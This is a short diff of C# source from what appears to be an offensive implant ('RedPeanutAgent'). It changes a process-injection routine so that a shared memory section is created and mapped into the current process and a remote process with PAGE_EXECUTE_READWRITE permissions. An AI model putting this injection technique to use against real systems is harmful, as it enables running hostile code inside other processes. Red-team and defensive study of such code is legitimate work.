@@ -203,7 +203,7 @@ namespace RedPeanutAgent.Execution
 
             //Crteate section in current process
             IntPtr section = IntPtr.Zero;
-            section = InjectionHelper.CreateSection(size);
+            section = InjectionHelper.CreateSection(size, Core.Natives.PAGE_EXECUTE_READWRITE);
             if (section == IntPtr.Zero)
             {
                 return;
@@ -212,7 +212,7 @@ namespace RedPeanutAgent.Execution
             //Map section to current process
             IntPtr baseAddr = IntPtr.Zero;
             IntPtr viewSize = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, Core.Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
+            InjectionHelper.MapViewOfSection(section, Core.Natives.GetCurrentProcess(), ref baseAddr, ref viewSize, Core.Natives.PAGE_EXECUTE_READWRITE);
             if (baseAddr == IntPtr.Zero)
             {
                 return;
@@ -224,7 +224,7 @@ namespace RedPeanutAgent.Execution
             //Map remote section
             IntPtr baseAddrEx = IntPtr.Zero;
             IntPtr viewSizeEx = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx);
+            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx, Core.Natives.PAGE_EXECUTE_READWRITE);
             if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
             {
                 return;
